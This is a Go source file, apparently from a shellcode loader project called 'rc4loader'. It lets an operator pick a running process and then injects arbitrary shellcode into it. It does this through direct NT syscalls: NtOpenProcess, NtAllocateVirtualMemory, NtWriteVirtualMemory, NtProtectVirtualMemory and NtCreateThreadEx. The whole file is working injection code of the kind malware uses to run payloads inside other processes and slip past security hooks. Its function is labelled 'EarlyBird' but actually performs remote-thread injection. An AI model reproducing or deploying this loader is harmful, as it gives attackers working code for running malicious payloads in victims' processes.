package sh

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
	"unsafe"

	// Sub Repositories
	winapi "github.com/carved4/go-native-syscall"
	"rc4loader/pkg/process"
)

// SelectTargetProcess displays available processes and allows user to select one
func SelectTargetProcess() (uint32, error) {
	fmt.Println("[+] querying accessible user processes (system processes and protected processes filtered out)... [+]")
	
	processes, err := process.GetProcessList()
	if err != nil {
		return 0, fmt.Errorf("failed to get process list: %v", err)
	}
	
	if len(processes) == 0 {
		return 0, fmt.Errorf("no processes found")
	}
	
	fmt.Printf("\n[+] found %d accessible processes:\n", len(processes))
	fmt.Println("┌──────────┬────────────────────────────────────────────────────────────────────────┐")
	fmt.Println("│   PID    │                           Process Name                                 │")
	fmt.Println("├──────────┼────────────────────────────────────────────────────────────────────────┤")
	
	for _, proc := range processes {
		fmt.Printf("│ %-8d │ %-70s │\n", proc.Pid, proc.Name)
	}
	fmt.Println("└──────────┴────────────────────────────────────────────────────────────────────────┘")
	

	fmt.Print("\n[?] Enter target PID: ")
	reader := bufio.NewReader(os.Stdin)
	input, err := reader.ReadString('\n')
	if err != nil {
		return 0, fmt.Errorf("failed to read input: %v", err)
	}
	
	input = strings.TrimSpace(input)
	pid, err := strconv.ParseUint(input, 10, 32)
	if err != nil {
		return 0, fmt.Errorf("invalid PID format: %v", err)
	}
	

	found := false
	var selectedProcess process.ProcessInfo
	for _, proc := range processes {
		if proc.Pid == uint32(pid) {
			found = true
			selectedProcess = proc
			break
		}
	}
	
	if !found {
		return 0, fmt.Errorf("PID %d not found in process list", pid)
	}
	
	fmt.Printf("[+] selected target: %s (PID: %d) [+]\n", selectedProcess.Name, selectedProcess.Pid)
	return uint32(pid), nil
}


func NtInjectEarlyBird(pid uint32, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode cannot be empty")
	}
	
	if pid == 0 {
		return fmt.Errorf("invalid PID: 0")
	}

	fmt.Printf("[+] attempting injection into PID %d... [+]\n", pid)

	// Open the target process
	var processHandle uintptr
	clientId := winapi.CLIENT_ID{
		UniqueProcess: uintptr(pid),
		UniqueThread:  0,
	}
	
	// Setup object attributes
	objAttr := &winapi.OBJECT_ATTRIBUTES{
		Length:                   uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
		RootDirectory:           0,
		ObjectName:              nil, // nil for process opening
		Attributes:              0,
		SecurityDescriptor:      0,
		SecurityQualityOfService: 0,
	}

	// Open the process with required permissions
	status, err := winapi.NtOpenProcess(
		&processHandle,
		winapi.PROCESS_ALL_ACCESS,
		uintptr(unsafe.Pointer(objAttr)),
		uintptr(unsafe.Pointer(&clientId)),
	)

	if err != nil || !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("NtOpenProcess failed: 0x%x, %v", status, err)
	}
	defer winapi.NtClose(processHandle)

	fmt.Printf("[+] successfully opened process handle [+]\n")

	// Allocate memory in target process using NtAllocateVirtualMemory
	var baseAddress uintptr = 0
	regionSize := uintptr(len(shellcode))
	
	status, err = winapi.NtAllocateVirtualMemory(
		processHandle,
		&baseAddress,
		0, // zero bits
		&regionSize,
		winapi.MEM_COMMIT|winapi.MEM_RESERVE, // allocation type
		winapi.PAGE_READWRITE,
	)

	if err != nil || !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%x, %v", status, err)
	}

	if baseAddress == 0 {
		return fmt.Errorf("NtAllocateVirtualMemory returned null address")
	}

	fmt.Printf("[+] successfully allocated memory at 0x%x [+]\n", baseAddress)

	// Write shellcode into target process memory using NtWriteVirtualMemory
	var bytesWritten uintptr
	status, err = winapi.NtWriteVirtualMemory(
		processHandle,
		baseAddress,
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
		&bytesWritten,
	)

	if err != nil || !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("NtWriteVirtualMemory failed: 0x%x, %v", status, err)
	}

	fmt.Printf("[+] successfully wrote shellcode (%d bytes written, %d bytes intended) [+]\n", bytesWritten, len(shellcode))

	// Change memory permissions to RX using NtProtectVirtualMemory
	var oldProtect uintptr
	protectSize := uintptr(len(shellcode))
	
	status, err = winapi.NtProtectVirtualMemory(
		processHandle,
		&baseAddress,
		&protectSize,
		winapi.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	
	if err != nil || !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("NtProtectVirtualMemory failed: 0x%x, %v", status, err)
	}

	fmt.Printf("[+] successfully changed memory permissions to PAGE_EXECUTE_READ [+]\n")

	// Create a new thread to execute our shellcode
	var execThreadHandle uintptr
	status, err = winapi.NtCreateThreadEx(
		&execThreadHandle,
		winapi.THREAD_ALL_ACCESS,
		0, // object attributes
		processHandle,
		baseAddress, // start address (our shellcode)
		0, // parameter
		0, // creation flags (not suspended)
		0, // zero bits
		0, // stack size
		0, // maximum stack size
		0, // attribute list
	)

	if err != nil || !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("failed to create execution thread: 0x%x, %v", status, err)
	}
	defer winapi.NtClose(execThreadHandle)

	fmt.Printf("[+] successfully created execution thread [+]\n")

	// Wait for the shellcode thread to complete (with timeout)
	status, err = winapi.NtWaitForSingleObject(execThreadHandle, false, nil)
	if err != nil || !winapi.IsNTStatusSuccess(status) {
		// Don't fail on wait error, continue with cleanup
		fmt.Printf("[*] wait returned: 0x%x, %v (this is normal) [+]\n", status, err)
	}

	fmt.Printf("[+] shellcode execution completed [+]\n")
	return nil
}

// NtInjectEarlyBirdInteractive performs interactive process selection and injection
func NtInjectEarlyBirdInteractive(shellcode []byte) error {
	pid, err := SelectTargetProcess()
	if err != nil {
		return fmt.Errorf("process selection failed: %v", err)
	}
	
	return NtInjectEarlyBird(pid, shellcode)
}
